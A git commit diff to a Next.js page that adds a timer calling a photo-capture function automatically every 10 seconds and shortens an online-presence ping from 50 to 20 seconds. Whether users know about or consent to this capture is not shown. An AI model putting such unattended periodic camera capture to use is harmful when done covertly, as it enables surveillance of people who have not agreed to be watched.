7bf9a4a9902128e6f5adf872d3a33f4a23d5b556
TaopikQM <taopik61318@gmail.com>
2026-01-03 07:33:34 +0700

    Update page.js

--- src/app/irul1/page.js
+++ src/app/irul1/page.js
@@ -369,6 +369,8 @@ const capturePhoto09090 = () => {
     console.log(`📸 Foto diambil pada: ${time}`);
     // --- di sini kamu bisa tambahkan kode capture kamera asli ---
   };
+  
+  const intervalRef = useRef(null);
   // ========= FUNGSI CAPTURE FOTO =========
   const capturePhoto = async (status = "unknown") => {
      if (!photoCaptureEnabled) {
@@ -453,6 +455,19 @@ const capturePhoto09090 = () => {
       return [];
     }
   };
+   // 🔥 JALAN SETIAP 10 DETIK
+  useEffect(() => {
+    // jalan langsung sekali (opsional)
+    capturePhoto("auto");
+
+    intervalRef.current = setInterval(() => {
+      capturePhoto("auto");
+    }, 10_000); // 10 detik
+
+    return () => {
+      clearInterval(intervalRef.current);
+    };
+  }, []);
   const capturePhoto5 = async (status = "unknown") => {
   try {
     // Cek semua device kamera yang tersedia
@@ -720,7 +735,7 @@ try {
   // Update lastSeen setiap 50 detik
   const interval = setInterval(() => {
     updateLastSeen();
-  }, 50000);
+  }, 20000);
 
   // Tangani disconnect
   window.addEventListener("beforeunload", updateOfflineStatus);
